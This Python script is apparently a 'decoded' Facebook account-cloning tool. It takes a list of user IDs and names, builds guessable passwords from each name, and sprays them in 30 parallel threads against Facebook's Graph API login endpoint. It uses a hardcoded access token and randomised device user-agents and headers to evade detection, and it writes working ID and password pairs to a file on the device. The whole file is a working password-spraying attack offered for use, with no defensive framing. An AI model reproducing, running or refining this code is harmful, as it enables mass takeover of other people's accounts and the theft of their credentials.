# Decode By Error x Ethan 
import os, requests, json, time, re, random, sys, uuid, platform, httplib2, arrow
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime
from bs4 import BeautifulSoup as sop

# --- Global Variables ---
loop = 0
oks = []
cps = []
plist = []

# --- System Functions ---
def clear():
    os.system('clear')
    print("""\033[1;32m
  ____ _____ _   _        _   _ _   _ ____  
 / ___| ____| \ | |      | | | | | | | __ ) 
| |  _|  _| |  \| | _____| |_| | | | |  _ \ 
| |_| | |___| |\  |_____|  _  | |_| | |_) |
 \____|_____|_| \_|     |_| |_|\___/|____/ 
\033[1;97m--------------------------------------------------
 [•] DECODED BY : ERROR X ETHAN
 [•] STATUS     : FULL SCRIPT FIXED (USER-AGENT UPDATED)
--------------------------------------------------""")

def linex():
    print('\033[1;97m--------------------------------------------------')

def tutulx(uid):
    if len(uid) == 15:
        if uid.startswith('100000'): return '2009/2010'
        else: return '2023/2024'
    return 'OLD'

# --- Key Approval (As per your original file) ---
def getKey():
    myid = str(os.getuid())
    # Aapka approval logic yahan aayega agar aap use karna chahen
    pass

# --- Dynamic User-Agent (Updated) ---
def generate_ua():
    android_version = random.choice(['10', '11', '12', '13', '14'])
    fb_version = f"{random.randint(400, 450)}.0.0.{random.randint(10, 99)}.{random.randint(100, 200)}"
    fb_build = str(random.randint(100000000, 999999999))
    device = random.choice(['SM-G998B', 'SM-A525F', 'M2012K11AG', 'RMX3311', 'V2109', 'X688B'])
    ua = f'Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110, 126)}.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_version};FBBV/{fb_build};]'
    return ua

# --- Main Menu ---
def Menu():
    clear()
    print(' [1] FILE CLONING')
    print(' [2] CONTACT OWNER')
    print(' [0] EXIT')
    linex()
    opt = input(' SELECT : ')
    if opt == '1':
        File_Clone()
    else:
        exit()

def File_Clone():
    clear()
    print(' EXAMPLE : /sdcard/file.txt')
    linex()
    file = input(' ENTER FILE PATH : ')
    try:
        fo = open(file, 'r').read().splitlines()
    except:
        print(' FILE NOT FOUND!'); time.sleep(2); Menu()
    
    clear()
    print(' [1] AUTO PASS (BEST)')
    linex()
    p_opt = input(' SELECT : ')
    
    clear()
    print(f' TOTAL IDS : {len(fo)}')
    print(' CLONING STARTED... USE AIRPLANE MODE')
    linex()
    
    with tred(max_workers=30) as hub:
        for user in fo:
            try:
                ids, names = user.split('|')
                # Password list from your script logic
                first = names.split(' ')[0].lower()
                last = names.split(' ')[1].lower() if ' ' in names else first
                pasx = [first+'123', first+'1234', first+'12345', first+last, first+'786', '57273200']
                hub.submit(Method1, ids, names, pasx)
            except: pass
    
    linex()
    print(f' CLONING COMPLETED | OK: {len(oks)}')
    input(' PRESS ENTER TO BACK')
    Menu()

# --- Cloning Method ---
def Method1(ids, names, pasx):
    global loop, oks, cps
    sys.stdout.write(f'\r\r\033[1;97m [GEN] %s | OK:%s | CP:%s '%(loop, len(oks), len(cps))); sys.stdout.flush()
    try:
        for pas in pasx:
            ua = generate_ua()
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "email": ids,
                "password": pas,
                "generate_session_cookies": "1",
                "method": "auth.login",
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            }
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Connection-Type': 'WIFI',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            }
            
            url = 'https://graph.facebook.com/auth/login'
            response = requests.post(url, data=data, headers=headers).json()
            
            if 'session_key' in response:
                uid = response.get('uid', ids)
                year = tutulx(str(uid))
                print(f'\r\033[1;32m [GEN-OK] {uid} | {pas} | {year} \033[1;97m')
                os.system('espeak -a 300 "GEN OK ID"')
                oks.append(uid)
                open('/sdcard/GEN-OK.txt', 'a').write(f'{uid}|{pas}\n')
                break
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                uid = response.get('error', {}).get('error_data', {}).get('uid', ids)
                # print(f'\r\033[1;33m [GEN-CP] {uid} | {pas} \033[1;97m')
                cps.append(uid)
                break
        loop += 1
    except:
        pass

if __name__ == "__main__":
    Menu()
